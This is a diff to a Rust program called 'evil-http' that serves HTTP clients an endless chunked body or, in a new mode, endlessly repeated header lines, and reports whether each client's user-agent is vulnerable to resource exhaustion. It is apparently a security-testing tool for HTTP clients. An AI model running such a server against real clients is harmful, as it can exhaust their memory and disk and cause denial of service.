@@ -1,21 +1,22 @@
 use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
 
-use std::time::Duration;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
 use std::env;
 use std::str::FromStr;
 use std::thread;
 
-const HTTP_HEAD_SUCCESS_HEADERS: &[u8] = b"HTTP/1.1 200 OK\r
-Server: nginx\r
+const HTTP_200: &[u8] = b"HTTP/1.1 200 OK\r
+Server: nginx\r";
+
+const HTTP_HEAD_SUCCESS_HEADERS: &[u8] = b"
 Content-Type: image/jpeg\r
 Content-Length: 11509\r\n\r\n";
 
-const HTTP_GET_SUCCESS_HEADERS: &[u8] = b"HTTP/1.1 200 OK\r
-Server: nginx\r
-Transfer-Encoding: chunked\r
-Content-Type: image/jpeg\r\n\r\n";
+const HTTP_GET_SUCCESS_HEADERS: &[u8] = b"
+Content-Type: image/jpeg\r
+Transfer-Encoding: chunked\r\n\r\n";
 
 const BODY_CHUNK: &[u8] = &[0u8; 1024 * 1024];
 
@@ -24,32 +25,52 @@ const END: &[u8] = &[];
 struct EvilServer {
     mbs_to_send: usize,
     socket_timeout: Option<Duration>,
+    mode: u8,
 }
 
 impl EvilServer {
-    fn new(mbs_to_send: usize, secs: u64) -> EvilServer {
+    fn new(mbs_to_send: usize, secs: u64, mode: u8) -> EvilServer {
         EvilServer {
             mbs_to_send,
             socket_timeout: match secs {
                 0 => None,
                 x => Some(Duration::from_secs(x)),
             },
+            mode,
         }
     }
 
     fn write_get(&self, stream: &mut TcpStream, count: &mut usize) -> std::io::Result<()> {
-        stream.write_all(HTTP_GET_SUCCESS_HEADERS)?;
-        send_chunk(stream, IMAGE)?;
+        stream.write_all(HTTP_200)?;
         let mbs_to_send = if self.mbs_to_send > 0 {
             self.mbs_to_send
         } else {
             usize::MAX
         };
-        for _ in 0..mbs_to_send {
-            send_chunk(stream, BODY_CHUNK)?;
-            *count += 1;
+        match self.mode {
+            1 => {
+                for _ in 0..mbs_to_send {
+                    let now = SystemTime::now();
+                    let now = now
+                        .duration_since(UNIX_EPOCH)
+                        .expect("Time went backwards")
+                        .as_nanos();
+                    stream.write_all(format!("\n{}: woo\r", now).as_bytes())?;
+                    *count += 1;
+                }
+                stream.write_all(HTTP_HEAD_SUCCESS_HEADERS)?;
+                stream.write_all(IMAGE)?;
+            }
+            _ => {
+                stream.write_all(HTTP_GET_SUCCESS_HEADERS)?;
+                send_chunk(stream, IMAGE)?;
+                for _ in 0..mbs_to_send {
+                    send_chunk(stream, BODY_CHUNK)?;
+                    *count += 1;
+                }
+                send_chunk(stream, END)?;
+            }
         }
-        send_chunk(stream, END)?;
         stream.flush()?;
         Ok(())
     }
@@ -68,6 +89,7 @@ impl EvilServer {
         stream.set_nodelay(true)?;
 
         if head_request {
+            stream.write_all(HTTP_200)?;
             stream.write_all(HTTP_HEAD_SUCCESS_HEADERS)?;
             stream.flush()?;
         } else {
@@ -78,9 +100,13 @@ impl EvilServer {
                     println!("user-agent is vulnerable: {}", user_agent);
                 }
                 Err(e) => {
+                    let units = match self.mode {
+                        1 => " headers",
+                        _ => "mb",
+                    };
                     println!(
-                        "user-agent is NOT vulnerable: {}, aborted after {}mb, err: {}",
-                        user_agent, count, e
+                        "user-agent is NOT vulnerable: {}, aborted after {}{}, err: {}",
+                        user_agent, count, units, e
                     );
                 }
             }
@@ -145,14 +171,14 @@ fn main() {
     let args = Args::new(args);
     if args.get_str(1, "").contains("-h") {
         println!(
-            "usage: {} [-h] [mbs-to-serve, 100] [host, 127.0.0.1:5555] [socket_timeout, 10]",
+            "usage: {} [-h] [mbs-to-serve, 100] [host, 127.0.0.1:5555] [mode, 0] [socket_timeout, 10]",
             args.get_str(0, "evil-http")
         );
         return;
     }
     let host = args.get_str(2, "0.0.0.0:5555");
 
-    let evil_server = EvilServer::new(args.get(1, 100), args.get(3, 10));
+    let evil_server = EvilServer::new(args.get(1, 100), args.get(4, 10), args.get(3, 0));
     let evil_server = Box::leak(Box::new(evil_server));
 
     let listener = TcpListener::bind(&host).unwrap();
